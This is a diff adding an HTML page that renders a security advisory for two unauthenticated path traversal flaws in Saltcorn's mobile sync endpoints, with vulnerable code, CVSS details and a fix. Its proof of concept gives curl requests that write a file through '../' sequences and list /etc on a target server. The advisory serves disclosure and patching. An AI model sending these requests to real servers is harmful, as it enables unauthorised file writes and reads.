@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Advisory - Unauthenticated Path Traversal in Saltcorn</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            line-height: 1.6;
+            color: #24292e;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f6f8fa;
+        }
+        h1 { color: #d73a49; }
+        h2 { color: #24292e; border-bottom: 1px solid #e1e4e8; padding-bottom: 10px; }
+        .advisory-header {
+            background: white;
+            padding: 20px;
+            border-left: 4px solid #d73a49;
+            margin-bottom: 20px;
+        }
+        .severity {
+            background: #ffeef0;
+            border: 1px solid #d73a49;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 10px 0;
+        }
+        .code-block {
+            background: #f6f8fa;
+            border: 1px solid #e1e4e8;
+            border-radius: 4px;
+            padding: 15px;
+            overflow-x: auto;
+            font-family: monospace;
+            font-size: 12px;
+            line-height: 1.5;
+        }
+        .cvss-info {
+            background: #fff5b6;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 15px 0;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+        }
+        th, td {
+            border: 1px solid #e1e4e8;
+            padding: 10px;
+            text-align: left;
+        }
+        th {
+            background: #f6f8fa;
+            font-weight: 600;
+        }
+        .impact-list {
+            background: white;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 15px 0;
+        }
+        .impact-list li {
+            margin-bottom: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="advisory-header">
+        <h1>Unauthenticated Path Traversal in Sync Endpoints</h1>
+        <p><strong>Advisory ID:</strong> GHSA-32pv-mpqg-h292</p>
+        <p><strong>CVE ID:</strong> CVE-2026-40163</p>
+        <p><strong>Published:</strong> April 9, 2026</p>
+        <p><strong>Reporter:</strong> axel-corsiez</p>
+    </div>
+
+    <section class="severity">
+        <h2>Severity: High</h2>
+        <p><strong>CVSS Score: 8.2/10</strong></p>
+        <p>Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N</p>
+    </section>
+
+    <h2>Affected Package</h2>
+    <table>
+        <tr>
+            <th>Package</th>
+            <th>Affected Versions</th>
+            <th>Patched Versions</th>
+        </tr>
+        <tr>
+            <td>@saltcorn/server (npm)</td>
+            <td>&lt;= 1.6.0-beta.2</td>
+            <td>1.4.5, 1.5.5, 1.6.0-beta.4</td>
+        </tr>
+    </table>
+
+    <h2>Summary</h2>
+    <p>Two unauthenticated path traversal vulnerabilities exist in Saltcorn's mobile sync endpoints. The
+    <code>POST /sync/offline_changes</code> endpoint permits an attacker to create arbitrary directories
+    and write JSON files anywhere on the server. The <code>GET /sync/upload_finished</code> endpoint allows
+    directory listing and reading of specific JSON files from arbitrary locations.</p>
+
+    <h2>Vulnerability Details</h2>
+
+    <h3>Finding 1: Arbitrary File Write (POST /sync/offline_changes)</h3>
+    <p>The <code>newSyncTimestamp</code> parameter is directly used in path operations without validation:</p>
+    <div class="code-block">
+const syncDirName = `${newSyncTimestamp}_${req.user?.email || "public"}`;
+const syncDir = path.join(
+    rootFolder.location, "mobile_app", "sync", syncDirName
+);
+await fs.mkdir(syncDir, { recursive: true });
+await fs.writeFile(
+    path.join(syncDir, "changes.json"),
+    JSON.stringify(changes)
+);
+    </div>
+    <p>No authentication is required. By setting <code>newSyncTimestamp</code> to <code>../../../../tmp/evil</code>,
+    an attacker can write files outside the intended directory.</p>
+
+    <h3>Finding 2: Arbitrary Directory Read (GET /sync/upload_finished)</h3>
+    <p>The <code>dir_name</code> query parameter is used unsafely:</p>
+    <div class="code-block">
+const syncDir = path.join(
+    rootFolder.location, "mobile_app", "sync", dir_name
+);
+let entries = await fs.readdir(syncDir);
+    </div>
+    <p>An attacker can enumerate directory contents and read JSON files from any location on the system.</p>
+
+    <h2>Impact</h2>
+    <div class="impact-list">
+        <ul>
+            <li>Unauthenticated directory creation anywhere on the filesystem</li>
+            <li>Unauthenticated JSON file writes to any writable location</li>
+            <li>Unauthenticated directory listing capabilities</li>
+            <li>Unauthenticated JSON file reading from arbitrary paths</li>
+            <li>Potential remote code execution via writes to sensitive system paths</li>
+        </ul>
+    </div>
+
+    <h2>Proof of Concept</h2>
+    <div class="code-block">
+# Write arbitrary file to /tmp/
+curl -X POST http://TARGET:3000/sync/offline_changes \
+  -H "Content-Type: application/json" \
+  -d '{
+    "newSyncTimestamp": "../../../../tmp/saltcorn_poc",
+    "oldSyncTimestamp": "0",
+    "changes": {"proof": "path_traversal_write"}
+  }'
+
+# List /etc/ directory
+curl "http://TARGET:3000/sync/upload_finished?dir_name=../../../../etc"
+    </div>
+
+    <h2>Remediation</h2>
+    <p>Apply path validation using the existing <code>File.normalise_in_base()</code> function to both
+    vulnerable endpoints, consistent with the already-patched <code>clean_sync_dir</code> endpoint:</p>
+    <div class="code-block">
+// offline_changes fix
+const syncDir = File.normalise_in_base(
+    path.join(rootFolder.location, "mobile_app", "sync"),
+    syncDirName
+);
+if (!syncDir) {
+    return res.status(400).json({ error: "Invalid sync directory name" });
+}
+
+// upload_finished fix
+const syncDir = File.normalise_in_base(
+    path.join(rootFolder.location, "mobile_app", "sync"),
+    dir_name
+);
+if (!syncDir) {
+    return res.json({ finished: false });
+}
+    </div>
+    <p>Additionally, add authentication middleware to endpoints that modify server state.</p>
+
+    <h2>Related Vulnerabilities</h2>
+    <p>This advisory addresses a similar class of issue previously patched in GHSA-43f3-h63w-p6f6,
+    but in different endpoint implementations within the same file.</p>
+
+    <h2>Weakness Classification</h2>
+    <p><strong>CWE-22:</strong> Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)</p>
+
+    <div class="cvss-info">
+        <h3>CVSS v3.1 Base Metrics</h3>
+        <table>
+            <tr>
+                <th>Metric</th>
+                <th>Value</th>
+            </tr>
+            <tr>
+                <td>Attack Vector</td>
+                <td>Network</td>
+            </tr>
+            <tr>
+                <td>Attack Complexity</td>
+                <td>Low</td>
+            </tr>
+            <tr>
+                <td>Privileges Required</td>
+                <td>None</td>
+            </tr>
+            <tr>
+                <td>User Interaction</td>
+                <td>None</td>
+            </tr>
+            <tr>
+                <td>Scope</td>
+                <td>Unchanged</td>
+            </tr>
+            <tr>
+                <td>Confidentiality Impact</td>
+                <td>Low</td>
+            </tr>
+            <tr>
+                <td>Integrity Impact</td>
+                <td>High</td>
+            </tr>
+            <tr>
+                <td>Availability Impact</td>
+                <td>None</td>
+            </tr>
+        </table>
+    </div>
+
+</body>
+</html>
